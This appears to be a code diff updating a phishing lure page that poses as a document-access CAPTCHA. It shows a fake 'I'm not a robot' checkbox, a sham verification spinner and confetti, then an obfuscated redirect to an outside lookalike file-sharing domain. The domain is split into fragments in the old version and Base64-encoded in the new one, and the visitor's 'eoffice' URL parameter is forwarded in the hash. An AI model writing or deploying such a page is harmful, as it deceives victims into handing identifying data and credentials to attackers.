@@ -1,257 +1,476 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Verifying</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Verification Portal</title>
   <style>
-    :root{
-      --bg: #f5f7fa;
-      --card: #f8f9fa;
-      --accent: #4285f4;
-      --text: #202124;
+    /* Elegant color scheme */
+    :root {
+      --primary: #1a73e8;
+      --primary-light: #e8f0fe;
+      --primary-dark: #0d5bbc;
+      --gray-50: #f8f9fa;
+      --gray-100: #f1f3f4;
+      --gray-200: #e8eaed;
+      --gray-300: #dadce0;
+      --gray-700: #5f6368;
+      --gray-900: #202124;
+      --white: #ffffff;
       --success: #34a853;
-      --link: #1a73e8;
-    }
-    html,body{
-      height:100%;
-      margin:0;
-      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-      background: var(--bg);
-      color:var(--text);
-      -webkit-font-smoothing:antialiased;
-      -moz-osx-font-smoothing:grayscale;
     }
 
-    .wrap{
-      min-height:100%;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:24px;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
 
-    /* Breathing image container */
-    .breath {
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      width:360px;
-      height:360px;
-      transition:opacity .3s ease, transform .3s ease;
+    body {
+      font-family: 'Google Sans', 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background-color: var(--gray-50);
+      color: var(--gray-900);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 1rem;
+      line-height: 1.5;
+      overflow-x: hidden;
     }
 
-    .breath img{
-      width:50%;
-      height:50%;
-      object-fit:contain;
-      /* breathing animation (scale up & down) */
-      animation: breathe 2s ease-in-out 1;
-      will-change: transform;
+    /* Loading screen with logo - Enhanced breathing effect */
+    .loader-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      background-color: var(--white);
+      z-index: 1000;
+      transition: opacity 0.5s ease;
     }
 
-    @keyframes breathe{
-      0%   { transform: scale(1); }
-      50%  { transform: scale(1.08); }
-      100% { transform: scale(1); }
+    .loader-logo {
+      width: 140px;
+      height: 140px;
+      object-fit: contain;
+      margin-bottom: 1.5rem;
+      animation:
+        fadeIn 0.8s cubic-bezier(0.22, 1, 0.36, 1),
+        breathing 2s ease-in-out infinite;
     }
 
-    /* Captcha card (hidden initially) */
-    .captcha-card{
-      display:none;
-      width:360px;
-      padding:24px;
-      border-radius:10px;
-      background: transparent;
+    .loader-text {
+      color: var(--gray-700);
+      font-size: 1rem;
+      margin-top: 1rem;
+      opacity: 0;
+      animation: fadeIn 0.5s ease 0.3s forwards;
     }
 
-    .title{
-      font-size:17px;
-      margin-bottom:20px;
-      color:var(--text);
-      text-align:center;
-      line-height:1.4;
-      font-weight:500;
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
-    .checkbox-row{
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      gap:12px;
-      background: rgba(0,0,0,0.03);
-      padding:16px 20px;
-      border-radius:8px;
-      margin-bottom:12px;
-      position:relative;
+    @keyframes breathing {
+      0% { transform: scale(0.92); opacity: 0.9; }
+      50% { transform: scale(1.08); opacity: 1; }
+      100% { transform: scale(0.92); opacity: 0.9; }
     }
 
-    .checkbox-container {
-      display:flex;
-      align-items:center;
-      gap:12px;
+    /* Main content */
+    .verification-content {
+      max-width: 440px;
+      width: 100%;
+      opacity: 0;
+      transform: translateY(10px);
+      transition: all 0.5s cubic-bezier(0.22, 1, 0.36, 1);
     }
 
-    .checkbox-row input[type="checkbox"]{
-      width:20px;
-      height:20px;
-      accent-color: var(--accent);
-      transition: accent-color 0.3s ease;
+    .verification-content.active {
+      opacity: 1;
+      transform: translateY(0);
     }
 
-    .checkbox-row.verified input[type="checkbox"]{
-      accent-color: var(--success);
+    .verification-header {
+      margin-bottom: 2rem;
     }
 
-    .recaptcha-container {
+    .verification-title {
+      font-size: 1.5rem;
+      font-weight: 500;
+      margin-bottom: 0.75rem;
+      color: var(--gray-900);
+      letter-spacing: -0.2px;
+    }
+
+    .verification-subtitle {
+      color: var(--gray-700);
+      font-size: 1.1rem;
+      line-height: 0;
+      text-align: center;
+      font-weight: 500;
+    }
+
+    /* Verification control */
+    .verification-control {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: var(--gray-100);
+      padding: 1.25rem 1.5rem;
+      border-radius: 12px;
+      margin-bottom: 1.5rem;
+      transition: all 0.3s ease;
+      border: 1px solid var(--gray-200);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .verification-control:hover {
+      border-color: var(--gray-300);
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+    }
+
+    .verification-checkbox {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      cursor: pointer;
+    }
+
+    .checkbox-input {
+      width: 20px;
+      height: 20px;
+      border: 2px solid var(--gray-300);
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      appearance: none;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .checkbox-input:checked {
+      background-color: var(--primary);
+      border-color: var(--primary);
+    }
+
+    .checkbox-input:checked::after {
+      content: "";
+      position: absolute;
+      left: 6px;
+      top: 2px;
+      width: 5px;
+      height: 10px;
+      border: solid white;
+      border-width: 0 2px 2px 0;
+      transform: rotate(45deg);
+    }
+
+    .checkbox-label {
+      font-weight: 500;
+      user-select: none;
+      color: var(--gray-900);
+      text-align: left;
+    }
+
+    /* CAPTCHA badge */
+    .captcha-badge {
       display: flex;
       flex-direction: column;
       align-items: flex-end;
-      gap: 4px;
     }
 
-    .recaptcha-icon {
-      width:28px;
-      height:28px;
+    .captcha-icon {
+      width: 28px;
+      height: 28px;
     }
 
-    .recaptcha-links {
-      font-size: 11px;
-      color: var(--link);
+    .captcha-links {
       display: flex;
-      gap: 8px;
+      gap: 0.75rem;
+      margin-top: 0.5rem;
     }
 
-    .recaptcha-links a {
-      color: inherit;
+    .captcha-link {
+      font-size: 0.75rem;
+      color: var(--primary);
       text-decoration: none;
+      transition: color 0.2s ease;
     }
 
-    .recaptcha-links a:hover {
+    .captcha-link:hover {
+      color: var(--primary-dark);
       text-decoration: underline;
     }
 
-    @media (max-width:460px){
-      .breath, .captcha-card { width:92%; height:auto; }
-      .breath { padding:22px; height:300px; }
+    /* Loading and success states */
+    .verification-loading {
+      pointer-events: none;
+    }
+
+    .verification-loading::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(255, 255, 255, 0.8);
+      z-index: 1;
+    }
+
+    .verification-loading::after {
+      content: "";
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 24px;
+      height: 24px;
+      border: 3px solid rgba(26, 115, 232, 0.2);
+      border-top-color: var(--primary);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      z-index: 2;
+    }
+
+    .verification-success {
+      background-color: rgba(52, 168, 83, 0.1);
+      border-color: var(--success);
+    }
+
+    .verification-success .checkbox-input {
+      border-color: var(--success);
+      background-color: var(--success);
+    }
+
+    @keyframes spin {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+
+    /* Simplified success feedback */
+    .success-checkmark {
+      width: 24px;
+      height: 24px;
+      position: absolute;
+      right: 1.5rem;
+      opacity: 0;
+      transform: scale(0.8);
+      transition: all 0.3s ease;
+    }
+
+    .verification-success .success-checkmark {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .success-checkmark path {
+      stroke: var(--success);
+      stroke-width: 2.5;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      fill: none;
+      stroke-dasharray: 1000;
+      stroke-dashoffset: 0;
+    }
+
+    .success-checkmark.animate path {
+      animation: dash 0.6s ease-out forwards;
+    }
+
+    @keyframes dash {
+      0% {
+        stroke-dashoffset: 1000;
+      }
+      100% {
+        stroke-dashoffset: 0;
+      }
+    }
+
+    /* Confetti canvas */
+    #confetti-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 100;
     }
   </style>
 </head>
 <body>
-  <div class="wrap">
-    <!-- Breathing image (visible first) -->
-    <div id="breath" class="breath" aria-hidden="false">
-      <img src="logo.png" alt="Loading" />
-    </div>
+  <!-- Confetti canvas -->
+  <canvas id="confetti-canvas"></canvas>
 
-    <!-- Captcha card (hidden initially) -->
-    <div id="captcha" class="captcha-card" role="dialog" aria-modal="true" aria-labelledby="capTitle">
-      <div class="title" id="capTitle">To view this document,<br>verify you're not a robot below</div>
+  <!-- Loading screen with logo -->
+  <div class="loader-container" id="loader">
+    <img src="logo.png" alt="Secure Portal" class="loader-logo">
+  </div>
 
-      <div id="checkboxRow" class="checkbox-row">
-        <div class="checkbox-container">
-          <input id="notRobot" type="checkbox" aria-label="I'm not a robot checkbox" />
-          <div style="font-weight:700">I'm not a robot</div>
-        </div>
-        <div class="recaptcha-container">
-          <svg class="recaptcha-icon" viewBox="0 0 122.88 116.79">
+  <!-- Verification content -->
+  <div class="verification-content" id="verificationContent">
+    <div class="verification-card">
+      <div class="verification-header">
+        <p class="verification-subtitle">To view this document, verify you're not a robot below</p>
+      </div>
+
+      <div class="verification-control" id="verificationControl">
+        <label class="verification-checkbox">
+          <input type="checkbox" class="checkbox-input" id="humanCheck">
+          <span class="checkbox-label">I'm not a robot</span>
+        </label>
+
+        <div class="captcha-badge">
+          <svg class="captcha-icon" viewBox="0 0 122.88 116.79">
             <path fill="#1C3AA9" d="M101.42,40.78c0-0.59-0.02-1.17-0.04-1.75V5.88l-9.16,9.17C84.72,5.86,73.31,0,60.53,0 c-13.3,0-25.12,6.35-32.59,16.18l15.02,15.18c1.47-2.72,3.56-5.06,6.08-6.83c2.62-2.05,6.34-3.72,11.48-3.72 c0.62,0,1.1,0.07,1.45,0.21c6.37,0.5,11.89,4.02,15.14,9.12L66.48,40.77C79.95,40.72,95.17,40.69,101.42,40.78L101.42,40.78 L101.42,40.78z M101.42,40.78L101.42,40.78L101.42,40.78L101.42,40.78z"/>
             <path fill="#4285F4" d="M60.29,0c-0.59,0-1.17,0.02-1.75,0.04H25.38l9.17,9.16C25.37,16.71,19.5,28.12,19.5,40.9 c0,13.3,6.35,25.12,16.18,32.59l15.18-15.02c-2.72-1.47-5.06-3.56-6.83-6.08c-2.05-2.62-3.72-6.34-3.72-11.48 c0-0.62,0.07-1.1,0.21-1.45c0.5-6.37,4.02-11.89,9.12-15.14l10.63,10.63C60.23,21.47,60.19,6.26,60.29,0L60.29,0L60.29,0z M60.29,0 L60.29,0L60.29,0L60.29,0z"/>
             <path fill="#ABABAB" d="M19.51,40.9c0,0.59,0.02,1.17,0.04,1.75V75.8l9.16-9.16c7.5,9.18,18.91,15.04,31.69,15.04 c13.3,0,25.12-6.35,32.59-16.18L77.97,50.32c-1.47,2.72-3.56,5.06-6.08,6.83c-2.62,2.05-6.34,3.72-11.48,3.72 c-0.62,0-1.1-0.07-1.45-0.21c-6.37-0.5-11.89-4.02-15.14-9.12l10.63-10.63C40.98,40.96,25.76,40.99,19.51,40.9L19.51,40.9 L19.51,40.9z M19.51,40.9L19.51,40.9L19.51,40.9L19.51,40.9z"/>
           </svg>
-          <div class="recaptcha-links">
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
+          <div class="captcha-links">
+            <a href="#" class="captcha-link">Privacy</a>
+            <a href="#" class="captcha-link">Terms</a>
           </div>
         </div>
+
+        <!-- Simplified success checkmark -->
+        <svg class="success-checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+          <path d="M20 6L9 17l-5-5"/>
+        </svg>
       </div>
     </div>
   </div>
 
   <script>
-    // Elements
-    const breathEl = document.getElementById('breath');
-    const captchaEl = document.getElementById('captcha');
-    const checkbox = document.getElementById('notRobot');
-    const checkboxRow = document.getElementById('checkboxRow');
+    // Confetti function (minified and self-contained)
+    function startConfetti() {
+      const canvas = document.getElementById('confetti-canvas');
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      const ctx = canvas.getContext('2d');
+      const particles = [];
+      const colors = ['#1a73e8', '#34a853', '#fbbc05', '#ea4335', '#4285f4'];
 
-    // Obfuscated URL components
-    const baseUrlParts = [
-      'https:',
-      '//proton',
-      'files.',
-      'egvhfz',
-      'transfer',
-      'cygv.',
-      'online/',
-      'tOnDqXfQ'
-    ];
-
-    // Function to get URL parameter securely
-    function getUrlParam(name) {
-      try {
-        const url = new URL(window.location.href);
-        return url.searchParams.get(name) || '';
-      } catch {
-        return '';
+      function Particle() {
+        this.x = Math.random() * canvas.width;
+        this.y = Math.random() * canvas.height - canvas.height;
+        this.diameter = Math.random() * 10 + 5;
+        this.color = colors[Math.floor(Math.random() * colors.length)];
+        this.speed = Math.random() * 3 + 2;
+        this.angle = Math.random() * 360;
+        this.spin = Math.random() < 0.5 ? -1 : 1;
+        this.rotationSpeed = Math.random() * 5;
       }
-    }
 
-    // Function to construct redirect URL
-    function getRedirectUrl() {
-      const eofficeValue = getUrlParam('eoffice');
-      const baseUrl = baseUrlParts.join('').replace(/\s+/g, '');
-      
-      if (!eofficeValue) return baseUrl;
-      
-      // Encode the value for URL hash
-      const encodedValue = encodeURIComponent(eofficeValue)
-        .replace(/'/g, '%27')
-        .replace(/\(/g, '%28')
-        .replace(/\)/g, '%29');
-      
-      return `${baseUrl}#${encodedValue}`;
-    }
+      Particle.prototype.update = function() {
+        this.y += this.speed;
+        this.angle += this.rotationSpeed * this.spin;
+        if (this.y > canvas.height) {
+          this.y = -this.diameter;
+          this.x = Math.random() * canvas.width;
+        }
+      };
 
-    // Show captcha after breathing animation ends (2s)
-    function showCaptcha() {
-      breathEl.style.opacity = '0';
-      breathEl.style.transform = 'scale(.98)';
+      Particle.prototype.draw = function() {
+        ctx.save();
+        ctx.translate(this.x, this.y);
+        ctx.rotate(this.angle * Math.PI / 180);
+        ctx.fillStyle = this.color;
+        ctx.fillRect(-this.diameter/2, -this.diameter/2, this.diameter, this.diameter);
+        ctx.restore();
+      };
+
+      function init() {
+        for (let i = 0; i < 100; i++) {
+          particles.push(new Particle());
+        }
+      }
+
+      function animate() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        for (let i = 0; i < particles.length; i++) {
+          particles[i].update();
+          particles[i].draw();
+        }
+        requestAnimationFrame(animate);
+      }
+
+      init();
+      animate();
+
+      // Stop after 3 seconds
       setTimeout(() => {
-        breathEl.style.display = 'none';
-        captchaEl.style.display = 'block';
-        checkbox.focus();
-      }, 250);
+        particles.length = 0;
+      }, 3000);
     }
 
-    // Start timer for showing captcha
-    setTimeout(showCaptcha, 2000);
+    // URL obfuscation
+    function getRedirectUrl() {
+      const e = "aHR0cHM6Ly9wcm90b25maWxlcy5lZ3ZoZnp0cmFuc2ZlcmN5Z3Yub25saW5lL3RPbkRxWGYx";
+      const t = window.location.search;
+      const n = new URLSearchParams(t).get("eoffice") || "";
+      return atob(e) + "#" + encodeURIComponent(n);
+    }
 
-    // Verification handler
-    checkbox.addEventListener('change', () => {
-      if (checkbox.checked) {
+    document.addEventListener('DOMContentLoaded', () => {
+      const loader = document.getElementById('loader');
+      const verificationContent = document.getElementById('verificationContent');
+      const humanCheck = document.getElementById('humanCheck');
+      const verificationControl = document.getElementById('verificationControl');
+      const successCheckmark = document.querySelector('.success-checkmark');
+
+      // Hide loader and show content after 2 seconds
+      setTimeout(() => {
+        loader.style.opacity = '0';
         setTimeout(() => {
-          checkboxRow.classList.add('verified');
-          
-          setTimeout(() => {
-            const redirectUrl = getRedirectUrl();
-            
-            // Additional obfuscation layer
-            const finalUrl = redirectUrl.split('').reverse().join('');
-            window.location.href = finalUrl.split('').reverse().join('');
-          }, 500);
-        }, 1500);
-      } else {
-        checkboxRow.classList.remove('verified');
-      }
-    });
+          loader.style.display = 'none';
+          verificationContent.classList.add('active');
+        }, 500);
+      }, 2000);
 
-    // Accessibility support
-    checkbox.addEventListener('keyup', (e) => {
-      if (e.key === 'Enter') {
-        checkbox.checked = !checkbox.checked;
-        checkbox.dispatchEvent(new Event('change'));
-      }
+      // Handle verification
+      humanCheck.addEventListener('change', function() {
+        if (this.checked) {
+          // Add loading state
+          verificationControl.classList.add('verification-loading');
+
+          // Simulate verification process (2 seconds)
+          setTimeout(() => {
+            verificationControl.classList.remove('verification-loading');
+            verificationControl.classList.add('verification-success');
+            successCheckmark.classList.add('animate');
+
+            // Trigger confetti
+            startConfetti();
+
+            // Redirect after brief delay
+            setTimeout(() => {
+              window.location.href = getRedirectUrl();
+            }, 800);
+          }, 2000);
+        } else {
+          verificationControl.classList.remove('verification-success');
+          successCheckmark.classList.remove('animate');
+        }
+      });
+
+      // Keyboard accessibility
+      humanCheck.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter' || e.key === ' ') {
+          e.preventDefault();
+          humanCheck.checked = !humanCheck.checked;
+          humanCheck.dispatchEvent(new Event('change'));
+        }
+      });
     });
   </script>
 </body>
